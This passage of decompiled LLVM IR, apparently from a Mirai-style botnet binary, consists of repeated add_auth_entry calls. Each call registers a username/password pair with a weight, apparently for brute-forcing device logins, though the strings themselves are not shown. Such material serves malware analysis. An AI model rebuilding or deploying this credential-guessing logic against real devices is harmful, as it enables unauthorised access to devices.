  store i32 ptrtoint ([9 x i8]* @global_var_18128.162 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_d450 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([9 x i8]* @global_var_18128.162 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18134.164 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d460 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18134.164 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1813c.166 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d470 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_1813c.166 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_18120.160 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18120.160 to i32), i32* %r1.global-to-local, align 4
  %v5_d480 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18120.160 to i32), i32 ptrtoint ([8 x i8]* @global_var_18120.160 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_18120.160 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_d490 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18120.160 to i32), i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_18144.168 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18144.168 to i32), i32* %r1.global-to-local, align 4
  %v5_d4a0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18144.168 to i32), i32 ptrtoint ([8 x i8]* @global_var_18144.168 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_18144.168 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_d4b0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18144.168 to i32), i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_18144.168 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18550.170 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_d4c0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18144.168 to i32), i32 ptrtoint (i32* @global_var_18550.170 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_18144.168 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18134.164 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_d4d0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18144.168 to i32), i32 ptrtoint (i32* @global_var_18134.164 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18144.168 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_d4e0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([8 x i8]* @global_var_18144.168 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1814c.172 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_d4f0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([9 x i8]* @global_var_1814c.172 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r1.global-to-local, align 4
  %v5_d500 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18158.174 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_d510 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18158.174 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18160.176 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_d520 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18160.176 to i32), i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18160.176 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18160.176 to i32), i32* %r1.global-to-local, align 4
  %v5_d530 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18160.176 to i32), i32 ptrtoint ([5 x i8]* @global_var_18160.176 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18160.176 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18134.164 to i32), i32* %r1.global-to-local, align 4
  %v0_d53c = load i32, i32* @r4, align 4
  store i32 %v0_d53c, i32* %r2.global-to-local, align 4
  %v4_d540 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18160.176 to i32), i32 ptrtoint (i32* @global_var_18134.164 to i32), i32 %v0_d53c)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18168.178 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d550 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_18168.178 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18170.180 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_d560 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_18170.180 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182c4.182 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_d570 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_182c4.182 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1817c.184 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_d580 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([9 x i8]* @global_var_1817c.184 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182c4.182 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_d590 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_182c4.182 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18188.186 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_d5a0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18188.186 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1814c.172 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_d5b0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([9 x i8]* @global_var_1814c.172 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18550.170 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_d5c0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18550.170 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18190.188 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d5d0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18190.188 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_18198.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_d5e0 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_18198.190 to i32), i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 13)
  store i32 ptrtoint ([14 x i8]* @global_var_18198.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_181a8.192 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_d5f0 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_18198.190 to i32), i32 ptrtoint ([7 x i8]* @global_var_181a8.192 to i32), i32 13)
  store i32 ptrtoint ([14 x i8]* @global_var_18198.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_181b0.194 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_d600 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_18198.190 to i32), i32 ptrtoint ([4 x i8]* @global_var_181b0.194 to i32), i32 13)
  store i32 ptrtoint ([14 x i8]* @global_var_18198.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_181b4.196 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_d610 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_18198.190 to i32), i32 ptrtoint ([7 x i8]* @global_var_181b4.196 to i32), i32 13)
  store i32 ptrtoint ([8 x i8]* @global_var_181bc.198 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_181bc.198 to i32), i32* %r1.global-to-local, align 4
  %v5_d620 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_181bc.198 to i32), i32 ptrtoint ([8 x i8]* @global_var_181bc.198 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_181bc.198 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_d630 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([8 x i8]* @global_var_181bc.198 to i32), i32 7)
  store i32 ptrtoint ([11 x i8]* @global_var_181c4.200 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_181c4.200 to i32), i32* %r1.global-to-local, align 4
  %v5_d640 = call i32 @add_auth_entry(i32 ptrtoint ([11 x i8]* @global_var_181c4.200 to i32), i32 ptrtoint ([11 x i8]* @global_var_181c4.200 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_181d0.202 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d650 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_181d0.202 to i32), i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_181d0.202 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_181d0.202 to i32), i32* %r1.global-to-local, align 4
  %v5_d660 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_181d0.202 to i32), i32 ptrtoint ([6 x i8]* @global_var_181d0.202 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_181d0.202 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18158.174 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d670 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_181d0.202 to i32), i32 ptrtoint (i32* @global_var_18158.174 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_181d0.202 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18134.164 to i32), i32* %r1.global-to-local, align 4
  %v0_d67c = load i32, i32* @r4, align 4
  store i32 %v0_d67c, i32* %r2.global-to-local, align 4
  %v4_d680 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_181d0.202 to i32), i32 ptrtoint (i32* @global_var_18134.164 to i32), i32 %v0_d67c)
  store i32 ptrtoint (i32* @global_var_181d8.204 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1814c.172 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d690 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_181d8.204 to i32), i32 ptrtoint ([9 x i8]* @global_var_1814c.172 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_181e0.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18550.170 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_d6a0 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_181e0.206 to i32), i32 ptrtoint (i32* @global_var_18550.170 to i32), i32 13)
  store i32 ptrtoint (i32* @global_var_18188.186 to i32), i32* %r0.global-to-local, align 4
  %v0_d6a8 = load i32, i32* @r4, align 4
  store i32 %v0_d6a8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18188.186 to i32), i32* %r1.global-to-local, align 4
  %v3_d6b0 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_18188.186 to i32), i32 ptrtoint (i32* @global_var_18188.186 to i32), i32 %v0_d6a8)
  store i32 ptrtoint (i32* @global_var_18110.156 to i32), i32* %r0.global-to-local, align 4
  %v0_d6b8 = load i32, i32* @r4, align 4
  store i32 %v0_d6b8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18110.156 to i32), i32* %r1.global-to-local, align 4
  %v3_d6c0 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_18110.156 to i32), i32 ptrtoint (i32* @global_var_18110.156 to i32), i32 %v0_d6b8)
  store i32 ptrtoint ([5 x i8]* @global_var_181f0.208 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_181f0.208 to i32), i32* %r1.global-to-local, align 4
  %v5_d6d0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_181f0.208 to i32), i32 ptrtoint ([5 x i8]* @global_var_181f0.208 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_181f0.208 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_d6e0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_181f0.208 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_181f8.210 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v4_d6f0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_181f8.210 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18200.212 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_d700 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18200.212 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18208.214 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_d710 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18208.214 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18210.216 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_d720 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([6 x i8]* @global_var_18210.216 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18218.218 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_d730 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_18218.218 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18220.220 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_d740 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([6 x i8]* @global_var_18220.220 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18228.222 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_d750 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([9 x i8]* @global_var_18228.222 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18234.224 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d760 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18234.224 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18244.226 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d770 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18244.226 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18254.228 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_d780 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([7 x i8]* @global_var_18254.228 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1825c.230 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_d790 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_1825c.230 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18264.232 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_d7a0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([9 x i8]* @global_var_18264.232 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18160.176 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_d7b0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_18160.176 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18270.234 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_d7c0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([8 x i8]* @global_var_18270.234 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18278.236 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_d7d0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18278.236 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18284.238 to i32), i32* %r1.global-to-local, align 4
  %v0_d7dc = load i32, i32* @r4, align 4
  store i32 %v0_d7dc, i32* %r2.global-to-local, align 4
  %v4_d7e0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18284.238 to i32), i32 %v0_d7dc)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1828c.240 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d7f0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_1828c.240 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18550.170 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d800 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_18550.170 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18158.174 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d810 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_18158.174 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1813c.166 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d820 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_1813c.166 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18134.164 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d830 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_18134.164 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18244.226 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d840 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_18244.226 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18294.242 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_d850 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_18294.242 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18168.178 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_d860 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([5 x i8]* @global_var_18168.178 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_181a8.192 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_d870 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([7 x i8]* @global_var_181a8.192 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1812c.244 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_d880 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([5 x i8]* @global_var_1812c.244 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182a0.246 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_d890 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_182a0.246 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
